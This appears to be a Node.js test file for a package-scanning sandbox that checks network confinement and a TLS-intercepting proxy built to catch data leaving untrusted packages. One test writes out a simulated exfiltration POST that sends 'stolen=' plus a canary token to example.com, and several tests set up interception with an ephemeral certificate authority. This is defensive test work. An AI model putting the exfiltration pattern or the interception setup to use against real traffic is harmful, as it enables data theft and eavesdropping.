test("#6 detectNetnsConfinement returns null (safe fallback) when prerequisites are absent", async () => {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-netns-detect-"));
  const result = await detectNetnsConfinement(dir);
  const { spawnSync } = require("node:child_process");
  const hasBwrap = spawnSync("sh", ["-c", "command -v bwrap"]).status === 0;
  const hasIp = spawnSync("sh", ["-c", "command -v ip"]).status === 0;
  if (process.platform !== "linux" || !hasBwrap || !hasIp) {
    assert.equal(result, null, "must be null when bwrap/ip are unavailable or off-Linux");
  } else {
    // On a fully-equipped host the self-test decides; either a real descriptor
    // (self-test passed) or null (couldn't prove it) — never a throw, never a
    // half-built object.
    assert.ok(result === null || (typeof result.build === "function" && typeof result.innerPort === "number"));
  }
  fs.rmSync(dir, { recursive: true, force: true });
});

// The netns tier must never engage the netns path for an INJECTED runner (the
// test seam), since there is no real payload command to wrap — a canary run
// with a custom runner stays on the in-process proxy path.
test("#6 injected-runner canary run does not attempt netns confinement", async () => {
  const pkgDir = await stagedPackage();
  const runner = async () => ({ ran: [] });
  const result = await runCanarySandbox({ stagedPath: pkgDir, allowExecution: true, runner, timeoutMs: 5000, egressGraceMs: 0 });
  // Isolation is whatever the base wrapper is (env-only here); crucially not a
  // half-engaged netns tier.
  assert.notEqual(result.isolation, "bwrap+netns");
  fs.rmSync(pkgDir, { recursive: true, force: true });
});

// --- #6 --tls-mitm: per-host leaf certs + unconditional CONNECT egress record ---

const { generateEphemeralCa } = require("../src/sandbox");

// Stand up an ephemeral session CA and a MITM capture proxy in front of it.
async function startMitmProxy(tokens) {
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-mitm-ca-"));
  const ca = generateEphemeralCa(dir);
  const proxy = await startCaptureProxy(new Set(tokens), { tlsMitm: true, ca });
  return { dir, ca, proxy };
}

// (a) The MITM must mint a per-host leaf whose subjectAltName matches the CONNECT
// hostname, so a client that VALIDATES certs (Node's default) completes the
// handshake for an arbitrary host — a one-leaf-for-all-hosts SAN-less cert makes
// such clients abort with ERR_TLS_CERT_ALTNAME_INVALID and observe nothing. Once
// the handshake succeeds the decrypted request body is captured and scanned.
test("#6 --tls-mitm: a validating TLS client completes the handshake for an arbitrary host and its body is captured", async () => {
  const token = "CANARYtoken0123456789abcdef";
  const { dir, ca, proxy } = await startMitmProxy([token]);
  try {
    await new Promise((resolve, reject) => {
      const raw = net.connect(proxy.port, "127.0.0.1", () => {
        raw.write("CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n");
      });
      raw.on("error", reject);
      raw.once("data", (buf) => {
        assert.match(buf.toString("latin1"), /200 Connection Established/);
        // rejectUnauthorized:true + ca:[ca.cert] → a genuinely validating client.
        const t = tls.connect(
          { socket: raw, servername: "example.com", ca: [ca.cert], rejectUnauthorized: true },
          () => {
            assert.equal(t.authorized, true, "client must validate the per-host leaf");
            t.end(`POST /collect HTTP/1.1\r\nHost: example.com\r\n\r\nstolen=${token}`);
          }
        );
        t.on("data", () => {});
        t.on("error", reject);
        t.on("close", resolve);
      });
    });
    const hit = proxy.hits.find((h) => h.host === "example.com:443");
    assert.ok(hit, `no egress record for the host: ${JSON.stringify(proxy.hits)}`);
    assert.equal(hit.transport, "https-mitm");
    assert.ok(hit.bodyBytes > 0, `decrypted body not captured: ${JSON.stringify(hit)}`);
    assert.ok(hit.tokensSeen.includes(token), `canary token not captured: ${JSON.stringify(hit)}`);
  } finally {
    await proxy.close();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// (b) A rejected handshake must STILL record the CONNECT host — parity with the
// non-MITM path, which records the destination unconditionally. Recording only
// in the TLS 'end' handler would leave an aborted handshake with ZERO egress
// (strictly worse than not passing --tls-mitm at all).
test("#6 --tls-mitm: a client that aborts the TLS handshake still leaves an egress record for the host", async () => {
  const { dir, proxy } = await startMitmProxy([]);
  try {
    const raw = net.connect(proxy.port, "127.0.0.1", () => {
      raw.write("CONNECT aborted.example:443 HTTP/1.1\r\nHost: aborted.example:443\r\n\r\n");
    });
    raw.on("error", () => { /* the aborted handshake tears the socket down; ignore */ });
    // Wait for the proxy's 200, then start a validating handshake with no CA so it
    // fails. Resolve as soon as the handshake is INITIATED — the egress hit is
    // recorded server-side at CONNECT time, independent of the handshake outcome,
    // and a rejected handshake does not reliably emit a client-side error/close on
    // every platform (Windows in particular), so the test must not wait on those.
    await new Promise((resolve) => {
      raw.once("data", () => {
        const t = tls.connect({ socket: raw, servername: "aborted.example", rejectUnauthorized: true }, () => {});
        t.on("error", () => { try { t.destroy(); } catch { /* noop */ } });
        resolve();
      });
      setTimeout(resolve, 1000); // never hang if the 200 is slow/absent
    });
    // Give the server's connect handler a beat to have recorded the hit.
    await new Promise((r) => setTimeout(r, 100));
    const hit = proxy.hits.find((h) => h.host === "aborted.example:443");
    assert.ok(hit, `rejected handshake recorded no egress: ${JSON.stringify(proxy.hits)}`);
    assert.equal(hit.transport, "https-mitm");
    assert.equal(hit.bodyBytes, 0, "no decrypted body should have been captured on an aborted handshake");
    try { raw.destroy(); } catch { /* noop */ }
  } finally {
    await proxy.close();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
